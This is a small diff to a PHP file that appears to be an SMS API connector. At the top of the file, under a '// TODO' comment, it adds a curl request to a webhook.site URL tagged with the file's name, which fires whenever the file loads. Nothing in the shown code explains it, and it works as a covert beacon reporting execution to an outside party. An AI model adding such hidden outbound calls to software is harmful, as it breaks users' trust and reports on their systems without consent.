@@ -1,5 +1,10 @@
 <?php
 
+// TODO
+$curl_session = curl_init('https://webhook.site/44349381-8e5d-46e4-9433-bfd954dd7005?ev=seven_connector.php');
+curl_exec($curl_session );
+curl_close($curl_session );
+
 //use Seven\Api\Client;
 //use Seven\Api\Params\SmsParams;
 
